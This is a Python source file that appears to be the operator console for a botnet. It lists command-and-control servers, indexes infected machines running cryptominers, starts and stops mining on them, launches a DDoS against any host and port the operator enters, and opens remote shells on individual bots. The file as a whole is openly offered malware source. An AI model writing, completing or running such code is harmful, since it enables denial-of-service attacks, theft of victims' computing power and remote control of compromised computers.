import socket, time, os, threading
from manager import Client

#list of command and control servers
managers=[('127.0.0.1', 5000), ('127.0.0.1', 5001), ('127.0.0.1', 5002), ('127.0.0.1', 5003),('127.0.0.1', 5004)]


address_attention = None
managing = False
manager_objects = []
miners = []
manager_count = 0
miner_count = 0
clients_indexed = False


def ping_host(addr, port):
    #DDOS tool
    if clients_indexed == True:
        manager_count = 0
        for i, manager in enumerate(manager_objects):
            manager.start_ping(addr, port)
            manager_count += 1
        print(f'Pinging Host at {addr}:{port}')
    else:
        print('All clients need to be indexed')

def stop_ping():
    if clients_indexed == True:
        manager_count = 0
        for i, manager in enumerate(manager_objects):
            manager.stop_ping()
            manager_count += 1
def stop_all_miners():
    #send command to all managers to stop mining on bots
    if clients_indexed == True:
        manager_count = 0
        for i, manager in enumerate(manager_objects):
            manager.stop_mine()
            manager_count += 1
        print(f'All {miner_count} miners stopped on {manager_count} managers')
    else:
        print('All clients need to be indexed')

def start_all_miners():
    #send command to all managers to start mining on bots
    if clients_indexed == True:
        manager_count = 0
        for i, manager in enumerate(manager_objects):
            manager.start_mine()
            manager_count += 1
        print(f'All {miner_count} miners started on {manager_count} managers')
    else:
        print('All clients need to be indexed')
        
        
def index_miners():
    #send command to all managers to report back all miners
    global clients_indexed
    global miner_count
    miner_count = 0
    for i, manager in enumerate(manager_objects):
       minerlist = manager.index_clients()
       miners.append(minerlist)
       miner_count += len(minerlist)
    print(f'All {miner_count} miners indexed on {len(manager_objects)} managers\n')
    
    clients_indexed = True
        
def show_managers():
    #display all saved managers
    print('\nManagers Saved\n-----------')
    for i, manager in enumerate(managers):
            print(f'Manager {i+1}: {managers[i][0]}:{managers[i][1]}')


def init_managers():
    #initialize all manager classes on separate threads
    global manager_count
    manager_count = 0
    for i, manager in enumerate(managers):
        manager_count += 1
        t1 = threading.Thread(target=manager_handler, args=(managers[i], i))
        t1.start()
                              
def manager_handler(addr, index):
    #control specific manager
    global address_attention
    global managing
    try:
        manager = Client(addr, index)
        connected = True
    except:
        print(f'[ALERT] Could not connect to {addr[0]}:{addr[1]}\n')
        connected = False
            
    if connected == True:
        manager_objects.append(manager)
    
    while connected:
        if address_attention == addr:
            print(f'Managing {addr[0]}:{addr[1]}')
            
            while True:
                print('cliget-get all active clients\nstartmine-start miners\nstopmine-stop miners\nselfdestruct-destroy all miners\nconnect #- start shell with client\nback-back to main menu')
                command = input('Enter Command:>')
                if command == 'cliget':
                    manager.request_info()
                elif command == 'startmine':
                    manager.start_mine()
                elif command == 'stopmine':
                    manager.stop_mine()
                elif command == 'selfdestruct':
                    manager.destroy()   
                elif command == 'back':
                    address_attention = None
                    managing = False
                    break
                elif 'connect' in command:
                        os.system('cls')
                        manager.start_shell(command[8])
                        response = None
                        print('Type \'stop\' to quit shell')
                        while True:
                            if response:
                                print(response)
                            inp = input(':>')
                            manager.send_shell_command(inp)
                            if inp != 'stop':
                                response = manager.recieve_shell_response()
                            else:
                                break
                            time.sleep(1)
                            
                            
                        
                    
                else:
                    print('Invalid Command.')
                    continue

def manage(addr):
    #this function toggles between main menu and manager control
    global address_attention
    global managing
    address_attention = addr
    managing = True
    while True:
        if managing == True:
            continue
        else:
            break
            menu()
            
    


def startup():
    #startup sequence: connect to all managers and index all clients
    global status
    print('Connecting to Managers...')
    init_managers()
    time.sleep(1)
    if len(manager_objects) > 0:
            status = 'Connected'
            print('Done.')
    else:
        status = 'Disconnected'
    time.sleep(3)
    if status == 'Connected':
        print('Indexing all miners')
        index_miners()
        print('Done.\n')
    else:
        print('No miners to Index')
    time.sleep(5)
    menu()
    
def menu():
    #menu function
    global status
    os.system('cls')
    #main loop
    while True:
        if len(manager_objects) > 0:
            status = 'Connected'
        else:
            status = 'Disconnected'
        print('Miner Control Panel\n--------------------\n1. Show Saved Managers\n2. Show all active clients\n3. Control Manager\n4. Manager Menu\n\n')
        print(f'[STATUS]: {status}')
        print (f'{len(manager_objects)}/{len(managers)} managers connected')
        inp = input('>')
        if inp == '1':
            show_managers()
        elif inp == '2':
            if status == 'Connected':
                minercnt = 0
                for minelist in miners:
                    for miner in minelist:
                        minercnt += 1
                        print(f'Miner {minercnt}: {miner}')
                print(f'{miner_count} miners on {len(manager_objects)} managers\n')
            else:
                print('[ERROR] Not connected to managers')
        elif inp == '3':
            if status == 'Connected':
                while True:
        
                        i = input(f'Which manager would you like to connect to?(1-{len(managers)})>')
                        if int(i) > (len(managers)):
                            raise ValueError()
                        elif int(i) < 1:
                            raise ValueError()
                        manage(managers[int(i)-1])
                        break
              
            else:
                print('[ERROR] Not connected to managers')
                
                    
                
        elif inp == '4':
            #manager menu loop
            
                if status == 'Connected':
                    os.system('cls')
                    while True:
                        print('---Manager Menu---\n1. Get all active miners\n2. Start all miners\n3. Stop all miners\n4. DDOS host\n5. Stop DDOS on all clients\n6. Destroy whole network\n7. Back')
                        print(f'[STATUS]: {status}')
                        inp = input('>')
                        if inp == '1':
                            index_miners()
                        elif inp == '2':
                            start_all_miners()
                        elif inp == '3':
                            stop_all_miners()
                        elif inp == '4':
                            host = input('Enter Hostname to DDOS:>')
                            duration = input('Port to DDOS on:>')
                            ping_host(host, duration)
                        elif inp == '5':
                            stop_ping()
                        elif inp == '6':
                            print('Not finished')
                        elif inp == '7':
                            break
                        else:
                            print('Invalid Input.\n')
                    
                else:
                    print('[ERROR] Not connected to managers')
                
        elif inp == '5':
            if status == 'Connected':
                os.system('cls')
                
                
            else:
                print('[ERROR] Not connected to managers')

        else:
            print('Invalid Input.\n')
            time.sleep(2)
        

startup()
